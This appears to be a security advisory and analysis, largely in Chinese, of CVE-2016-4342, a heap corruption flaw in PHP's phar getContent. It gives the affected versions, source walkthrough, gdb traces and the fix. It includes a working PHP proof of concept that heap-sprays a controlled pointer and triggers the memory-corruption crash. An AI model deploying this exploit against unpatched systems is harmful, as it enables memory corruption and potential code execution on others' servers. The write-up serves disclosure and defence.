# [PHP 'ext/phar/phar_object.c' Heap Buffer Overflow Vulnerability](http://www.securityfocus.com/bid/89154/info)

[analysis](https://bugs.php.net/bug.php?id=71354)

[SCAP CVE 通用漏洞与披露](http://cve.scap.org.cn/CVE-2016-4342.html)

## info

```
CVE:	CVE-2016-4342
Class:	Boundary Condition Error
Remote:	Yes
Local:	No
Published:	Apr 28 2016 12:00AM
Updated:	Oct 30 2016 12:03AM
Credit:	manhluat
Vulnerable:	
    Ubuntu Ubuntu Linux 16.04 LTS
    Ubuntu Ubuntu Linux 15.10
    Ubuntu Ubuntu Linux 14.04 LTS
    Ubuntu Ubuntu Linux 12.04 LTS
    PHP PHP 7.0 
    PHP PHP 5.6.17 
    PHP PHP 5.6.13 
    PHP PHP 5.6.12 
    PHP PHP 5.6.11 
    PHP PHP 5.6.5 
    PHP PHP 5.6.4 
    PHP PHP 5.6.1 
    PHP PHP 5.5.29 
    PHP PHP 5.5.28 
    PHP PHP 5.5.27 
    PHP PHP 5.5.26 
    PHP PHP 5.5.21 
    PHP PHP 5.5.14 
    + Mandriva Linux Mandrake 10.1 x86_64
    + Mandriva Linux Mandrake 10.1 
    + S.u.S.E. Linux Personal 9.2 
    + Turbolinux Turbolinux Server 10.0 
    + Ubuntu Ubuntu Linux 4.1 ppc
    + Ubuntu Ubuntu Linux 4.1 ia64
    + Ubuntu Ubuntu Linux 4.1 ia32
    PHP PHP 5.5.13 
    PHP PHP 5.5.12 
    PHP PHP 5.5.11 
    PHP PHP 5.5.10 
    PHP PHP 5.5.3 
    PHP PHP 5.5.1 
    PHP PHP 5.5 
    PHP PHP 7.0.2
    PHP PHP 7.0.1
    PHP PHP 5.6.9
    PHP PHP 5.6.8
    PHP PHP 5.6.7
    PHP PHP 5.6.6
    PHP PHP 5.6.3
    PHP PHP 5.6.2
    PHP PHP 5.6.14
    PHP PHP 5.6.10
    PHP PHP 5.6
    PHP PHP 5.5.31
    PHP PHP 5.5.30
    PHP PHP 5.5.25
    PHP PHP 5.5.24
    PHP PHP 5.5.23
    PHP PHP 5.5.22
    PHP PHP 5.5.20
    PHP PHP 5.5.2
    PHP PHP 5.5.19
    PHP PHP 5.5.18
    PHP PHP 5.5.17
    PHP PHP 5.5.16
    PHP PHP 5.5.15
    HP System Management Homepage 7.5 
    HP System Management Homepage 7.4
    HP System Management Homepage 7.3
    HP System Management Homepage 7.2
    HP System Management Homepage 7.1
    HP System Management Homepage 7.0
    HP System Management Homepage 6.0

Not Vulnerable:	
    PHP PHP 7.0.3 
    PHP PHP 5.6.18 
    PHP PHP 5.5.32 
    HP System Management Homepage 7.6
```

## detail

解析 `.tar/.zip/.phar` 文件时, 堆边界条件控制不严，导致可能`堆溢出`.

新建一个空文件"aaaa"(0 byte), 打包成 "aaaa.tar"文件，未压缩前`aaaa`的文件大小为`0`。通过`PharFileInfo`对象的`getContent()`方法获取`aaaa`文件的内容，例如： `var_dump($phar['aaaa']->getContent());`

查看`getContent`内部实现源码如下:

```c
ext/phar/phar_object.c:

PHP_METHOD(PharFileInfo, getContent)
{
...snip...
	Z_TYPE_P(return_value) = IS_STRING;
	Z_STRLEN_P(return_value) = php_stream_copy_to_mem(fp, &(Z_STRVAL_P(return_value)), link->uncompressed_filesize, 0);

	if (!Z_STRVAL_P(return_value)) {
		Z_STRVAL_P(return_value) = estrndup("", 0);
	}
...
}
```

`aaaa` 文件大小为`0`， 所以传递给`php_stream_copy_to_mem`函数进行处理，如下：

```c
main/streams/streams.c:

PHPAPI size_t _php_stream_copy_to_mem(php_stream *src, char **buf, size_t maxlen, int persistent STREAMS_DC TSRMLS_DC)
{
...snip...
	if (maxlen == 0) {
		return 0;
	}
...
	if (maxlen > 0) {
		ptr = *buf = pemalloc_rel_orig(maxlen + 1, persistent);
		while ((len < maxlen) && !php_stream_eof(src)) {
			ret = php_stream_read(src, ptr, maxlen - len);
...
}
```

从上面代码可以看出， `If maxlen == 0`, 它将返回 0, 这是ok的， 但是该函数的第二个参数`char **buf`, 将在堆上分配一个空间，从当前文件指针处读数据。

现在返回上一层函数进行分析， 变量 zval `return_value` 是未初始化的变量, `return_value->str.val`将是一个指针，指向之前调用函数分配的堆地址所指向的空间, gdb调试如下：

```
=> 0x817aacc <zim_PharFileInfo_getContent+300>: call   0x8267ad0 <_php_stream_copy_to_mem>
   0x817aad1 <zim_PharFileInfo_getContent+305>: mov    ecx,DWORD PTR [esp+0x54]
   0x817aad5 <zim_PharFileInfo_getContent+309>: mov    DWORD PTR [ecx+0x4],eax
   0x817aad8 <zim_PharFileInfo_getContent+312>: mov    eax,DWORD PTR [ecx]
   0x817aada <zim_PharFileInfo_getContent+314>: test   eax,eax
Guessed arguments:
arg[0]: 0xf7bd9a04 --> 0x8806a40 --> 0x826cad0 (<php_stdiop_write>:     push   ebx)
arg[1]: 0xf7bdd4b8 --> 0xf7bdd56c --> 0x1d 
arg[2]: 0x0 
arg[3]: 0x0 

Breakpoint 2, 0x0817aacc in zim_PharFileInfo_getContent (ht=0x0, return_value=0xf7bdd4b8, return_value_ptr=0xf7bbf094, this_ptr=0xf7bdd49c, return_value_used=0x1) at /root/fuzz/php-5.6.17/ext/phar/phar_object.c:4889
4889            Z_STRLEN_P(return_value) = php_stream_copy_to_mem(fp, &(Z_STRVAL_P(return_value)), link->uncompressed_filesize, 0);
```

从上面可以看出当前`return_value->str.val`就是`0xf7bdd56c`.

正如之前所分析的那样，`maxlen==0`,`_php_stream_copy_to_mem`返回0这是ok的, 但是调用该函数之后，参数`*buf` => `return_value->str.val`保留了函数调用过程中的数据，如下：

```
=> 0x817aad1 <zim_PharFileInfo_getContent+305>: mov    ecx,DWORD PTR [esp+0x54]
   0x817aad5 <zim_PharFileInfo_getContent+309>: mov    DWORD PTR [ecx+0x4],eax
   0x817aad8 <zim_PharFileInfo_getContent+312>: mov    eax,DWORD PTR [ecx]
   0x817aada <zim_PharFileInfo_getContent+314>: test   eax,eax
   0x817aadc <zim_PharFileInfo_getContent+316>: jne    0x817aa21 <zim_PharFileInfo_getContent+129>
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0817aad1      4889            Z_STRLEN_P(return_value) = php_stream_copy_to_mem(fp, &(Z_STRVAL_P(return_value)), link->uncompressed_filesize, 0);
gdb-peda$ x/10wx 0xf7bdd4b8
0xf7bdd4b8:     0xf7bdd56c      0x088086a0      0x00000001      0x00000006
0xf7bdd4c8:     0x00000000      0x00000010      0x0000001d      0x08820b20
0xf7bdd4d8:     0xf7bd97c4      0x00000091
gdb-peda$ print *(zval*)0xf7bdd4b8
$2 = {
  value = {
    lval = 0xf7bdd56c, 
    dval = 1.0010109254636237e-267, 
    str = {
      val = 0xf7bdd56c "\035", 
      len = 0x88086a0
    }, 
    ht = 0xf7bdd56c, 
    obj = {
      handle = 0xf7bdd56c, 
      handlers = 0x88086a0 <spl_filesystem_object_handlers>
    }, 
    ast = 0xf7bdd56c
  }, 
  refcount__gc = 0x1, 
  type = 0x6, 
  is_ref__gc = 0x0
}
```

`0xf7bdd56c` 仍然保留在`ZVAL(return_value)`.

之后， 这个`str.val`指针将被传递到 `_efree` 去清理 vm stack.

以某种方式， 我能管理`0xf7bdd56c`之前的地址，也绝对能管理 `mm_block(ESI register)` 的下一个地址， 如下：

```
zend_alloc.c:

static void _zend_mm_free_int(zend_mm_heap *heap, void *p ZEND_FILE_LINE_DC ZEND_FILE_LINE_ORIG_DC)
{
...

	next_block = ZEND_MM_BLOCK_AT(mm_block, size);
	if (ZEND_MM_IS_FREE_BLOCK(next_block)) {
		zend_mm_remove_from_free_list(heap, (zend_mm_free_block *) next_block);
		size += ZEND_MM_FREE_BLOCK_SIZE(next_block);
	}
...
```

我们能接管它的下一个地址和进一步控制堆


## 修复

调用`_php_stream_copy_to_mem`函数前, 初始化 `ZVAL(return_val)`

## poc

```php
<?php

echo "Making .tar file...\n";

$phar = new PharData('poc.tar');
$phar->addFromString('aaaa','');

echo "Trigger...\n";

//prepare
$spray = pack('IIII',0x41414141,0x42424242,0x43434343,0x4444444);
$spray = $spray.$spray.$spray.$spray.$spray.$spray.$spray.$spray;
$pointer = pack('I',0x13371337);


$p = new PharData($argv[1]);

// heap spray 
$a[] = $spray.(string)0;
$a[] = $spray.(string)1;
$a[] = $spray.(string)2;
$a[] = $spray.(string)3;
$a[] = $spray.(string)4;
$a[] = $spray.$pointer.(string)5;

var_dump($p['aaaa']->getContent());

// If this poc doesnt work, please un-comment line below.
// var_dump($p);
?>
```

run `"./sapi/cli/php ./poc.php ./poc.tar"`.

* Notice:
- This poc may not work to you, it bases on stack/heap data. If it doesnt, please do some stuff to spray the heap.
- Affects 
- PoC can run on 32 and 64bit.
- Works on Linux and Mac as well. 

### poc analysis

```
Expected result:
----------------
Program received signal SIGSEGV, Segmentation fault.

And we could control next_block (see $ESI register) of mm_block at zend_alloc.c:947

then we probably control heap memory to leak/write somewhere we want.

Actual result:
--------------
gdb-peda$ r
Starting program: /root/test/php-5.6.17/sapi/cli/php ./poc.php ./poc.tar
Making .tar file...
Trigger...
string(0) ""

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0xaf4e898 
EBX: 0x8804000 --> 0x8803dd8 --> 0x1 
ECX: 0xf7bdd564 --> 0x13371337 
EDX: 0xf7bdd56c --> 0x1d 
ESI: 0x13371334 
EDI: 0xf7bdd56c --> 0x1d 
EBP: 0x8820a58 --> 0x1 
ESP: 0xffffa020 --> 0x82e15f7 (<zend_objects_store_del_ref_by_handle_ex+7>:     add    ebx,0x522a09)
EIP: 0x82893cb (<_zend_mm_free_int+123>:        test   BYTE PTR [eax],0x1)
EFLAGS: 0x10203 (CARRY parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x82893c2 <_zend_mm_free_int+114>:   mov    eax,DWORD PTR [esp+0x8]
   0x82893c6 <_zend_mm_free_int+118>:   sub    DWORD PTR [ebp+0x34],esi
   0x82893c9 <_zend_mm_free_int+121>:   add    eax,esi
=> 0x82893cb <_zend_mm_free_int+123>:   test   BYTE PTR [eax],0x1
   0x82893ce <_zend_mm_free_int+126>:   mov    DWORD PTR [esp+0xc],eax
   0x82893d2 <_zend_mm_free_int+130>:   je     0x8289429 <_zend_mm_free_int+217>
   0x82893d4 <_zend_mm_free_int+132>:   mov    eax,DWORD PTR [edi-0x4]
   0x82893d7 <_zend_mm_free_int+135>:   test   al,0x1
[------------------------------------stack-------------------------------------]
0000| 0xffffa020 --> 0x82e15f7 (<zend_objects_store_del_ref_by_handle_ex+7>:    add    ebx,0x522a09)
0004| 0xffffa024 --> 0x8804000 --> 0x8803dd8 --> 0x1 
0008| 0xffffa028 --> 0xf7bdd564 --> 0x13371337 
0012| 0xffffa02c --> 0x8804000 --> 0x8803dd8 --> 0x1 
0016| 0xffffa030 --> 0x1 
0020| 0xffffa034 --> 0x881e740 --> 0x0 
0024| 0xffffa038 --> 0x88428c8 --> 0x1 
0028| 0xffffa03c --> 0x8804000 --> 0x8803dd8 --> 0x1 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
_zend_mm_free_int (heap=0x8820a58, p=p@entry=0xf7bdd56c) at /root/test/php-5.6.17/Zend/zend_alloc.c:2104
2104            if (ZEND_MM_IS_FREE_BLOCK(next_block)) {
gdb-peda$ print p
$1 = (void *) 0xf7bdd56c
gdb-peda$ x/10wx p-8
0xf7bdd564:     0x13371337      0x00000035      0x0000001d      0x00000091
0xf7bdd574:     0xf7bdd5a4      0x088086a0      0x00000000      0x00000005
0xf7bdd584:     0x00000000      0x0000001d
gdb-peda$ x/10wx p-16
0xf7bdd55c:     0x43434343      0x04444444      0x13371337      0x00000035
0xf7bdd56c:     0x0000001d      0x00000091      0xf7bdd5a4      0x088086a0
0xf7bdd57c:     0x00000000      0x00000005
gdb-peda$ bt
#0  _zend_mm_free_int (heap=0x8820a58, p=p@entry=0xf7bdd56c) at /root/test/php-5.6.17/Zend/zend_alloc.c:2104
#1  0x0828b7d8 in _efree (ptr=0xf7bdd56c) at /root/test/php-5.6.17/Zend/zend_alloc.c:2440
#2  0x082b22dc in _zval_dtor_func (zvalue=zvalue@entry=0xf7bdd4b8) at /root/test/php-5.6.17/Zend/zend_variables.c:46
#3  0x08361378 in _zval_dtor (zvalue=0xf7bdd4b8) at /root/test/php-5.6.17/Zend/zend_variables.h:35
#4  i_zval_ptr_dtor (zval_ptr=0xf7bdd4b8) at /root/test/php-5.6.17/Zend/zend_execute.h:79
#5  zend_vm_stack_clear_multiple (nested=0x0) at /root/test/php-5.6.17/Zend/zend_execute.h:308
#6  zend_do_fcall_common_helper_SPEC (execute_data=<optimized out>) at /root/test/php-5.6.17/Zend/zend_vm_execute.h:650
#7  0x082f1446 in execute_ex (execute_data=execute_data@entry=0xf7bbf3c0) at /root/test/php-5.6.17/Zend/zend_vm_execute.h:363
#8  0x0835f272 in zend_execute (op_array=0xf7bd8f44) at /root/test/php-5.6.17/Zend/zend_vm_execute.h:388
#9  0x082b4c1e in zend_execute_scripts (type=type@entry=0x8, retval=retval@entry=0x0, file_count=file_count@entry=0x3) at /root/test/php-5.6.17/Zend/zend.c:1341
#10 0x0824ef3e in php_execute_script (primary_file=primary_file@entry=0xffffc438) at /root/test/php-5.6.17/main/main.c:2597
#11 0x08363473 in do_cli (argc=argc@entry=0x3, argv=argv@entry=0x8820888) at /root/test/php-5.6.17/sapi/cli/php_cli.c:994
#12 0x08063f04 in main (argc=0x3, argv=0x8820888) at /root/test/php-5.6.17/sapi/cli/php_cli.c:1378
#13 0xf7c40a83 in __libc_start_main (main=0x80639f0 <main>, argc=0x3, argv=0xffffd744, init=0x836c520 <__libc_csu_init>, fini=0x836c590 <__libc_csu_fini>, rtld_fini=0xf7feb180 <_dl_fini>, stack_end=0xffffd73c) at libc-start.c:287
#14 0x08063f8a in _start ()
gdb-peda$ 
```